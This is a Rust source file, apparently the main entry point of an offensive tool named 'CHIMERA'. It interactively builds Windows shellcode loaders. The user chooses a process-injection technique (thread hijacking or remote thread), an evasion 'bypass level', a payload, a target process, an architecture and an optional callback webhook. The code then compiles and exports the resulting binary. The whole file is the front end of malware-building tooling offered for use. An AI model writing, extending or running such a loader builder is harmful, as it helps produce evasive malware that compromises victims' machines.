mod assets;
mod core;

use std::io::{self, Write};
use assets::gui_text::{print_tool_name, print_help};
use core::core_functions::{compile_loader, handle_payload, export_binary};

pub struct UserConfig {
    pub target_os: String,
    pub webhook: Option<String>,
    pub target_process: Option<String>,
}

fn prompt(text: &str) {
    println!("{}", text);
    print!("[CHIMERA][>]: ");
    io::stdout().flush().unwrap();
}

fn read_input() -> String {
    let mut input = String::new().to_lowercase();
    io::stdin().read_line(&mut input).expect("Failed to read line");
    println!("");
    input.trim().to_string()
}

fn main() {
    let target_os_list = vec!["x86_64-pc-windows-gnu", "i686-pc-windows-gnu"];
    let loader_directories: Vec<String> = vec![
        "src/injections/basic/thread_hijacking".to_string(), 
        "src/injections/basic/remote_thread".to_string(), 
    ];

    print_tool_name();
    print_help();
    println!("");

    loop {
        #[allow(unused)]
        let mut current_dir = String::new();

        /* INJECTION */
        prompt("\n[i]: Choose a number of injection to continue (1 - 2):");
        let injection_choice = read_input();
        println!("[CHIMERA][i]: Injection technique: {}", &injection_choice);
        println!("");

        /* BYPASS */
        prompt("[i]: Bypass Level (basic, moderate, difficult):");
        let bypass_level = read_input();

        if bypass_level == String::from("basic") {
            let current_directory = match injection_choice.as_str() {
                "1" => loader_directories[0].clone(),
                "2" => loader_directories[1].clone(),
                _ => {
                    println!("[CHIMERA][!] Invalid choice, Try Again.");
                    continue;
                }
            };
            current_dir = current_directory;
            println!("[CHIMERA][i]: Current injection directory: {}", &current_dir);
            println!("");
        } 
        else if bypass_level == String::from("moderate") || bypass_level == String::from("difficult") {
            println!("[CHIMERA][-]: {} version is not developed yet.", bypass_level);
            continue;
        } 
        else {
            println!("[CHIMERA][-]: Unknown Bypass Level.");
            continue;
        }

        /* DIRECTORY (Payload) */
        prompt("[i]: Enter your payload directory (or use the payload listed above):");
        let mut payload_dir = String::new();
        io::stdin().read_line(&mut payload_dir).expect("Failed to read line");

        if let Err(e) = handle_payload(&payload_dir, &current_dir) {
            println!("[CHIMERA][!] {}", e);
            continue;
        }
        println!("");

        /* TARGET PROCESS */
        prompt("[CHIMERA][i]: Enter target process directory (example: C:\\Windows\\System32\\cmd.exe) or type default:");
        let proc_raw = read_input();
        let target_process = if proc_raw == "default" || proc_raw.is_empty() {
            None
        } else {
            Some(proc_raw)
        };

        /* OPERATING SYSTEM */
        prompt("[i]: Target Operating System (Windows64 or Windows32):");
        let os_input = read_input();

        /* WEBHOOK */
        prompt("[i]: Would you like to use a webhook? (Y or N):");
        let webhook_url = if read_input() == "y" {
            prompt("[i]: Enter Webhook URL:");
            Some(read_input())
        } else {
            None
        };

        let config = UserConfig {
            target_os: if os_input.contains("windows64") { target_os_list[0].to_string() } else { target_os_list[1].to_string() },
            webhook: webhook_url,
            target_process,
        };

        compile_loader(
            &config.target_os,
            config.webhook.as_ref(),
            config.target_process.as_ref(),
            &current_dir,
        );

        match export_binary(&current_dir, &config.target_os) {
            Ok(_) => println!("[CHIMERA][+] Artifact successfully delivered to Desktop."),
            Err(e) => println!("[CHIMERA][!] Export failed: {}", e),
        }
    }
}